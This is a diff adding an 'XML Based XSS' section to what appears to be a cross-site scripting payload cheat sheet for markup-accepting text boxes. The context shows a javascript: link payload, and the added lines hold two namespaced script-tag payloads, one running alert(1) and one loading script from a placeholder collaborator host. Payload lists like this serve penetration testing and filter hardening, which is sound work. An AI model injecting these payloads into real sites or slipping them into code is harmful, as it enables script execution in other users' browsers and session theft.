@@ -26,3 +26,10 @@ Use this where text boxes, comment sections, etc that alows some markup input.
 ```
 [clickme](javascript:alert`1`)
 ```
+
+XML Based XSS
+
+```
+<x:script xmlns:x="http:/www.w3.org/1999/xhtml">alert(1)</x:script>
+<x:script xmlns:x="http:/www.w3.org/1999/xhtml" src="collaborattor"/>
+```
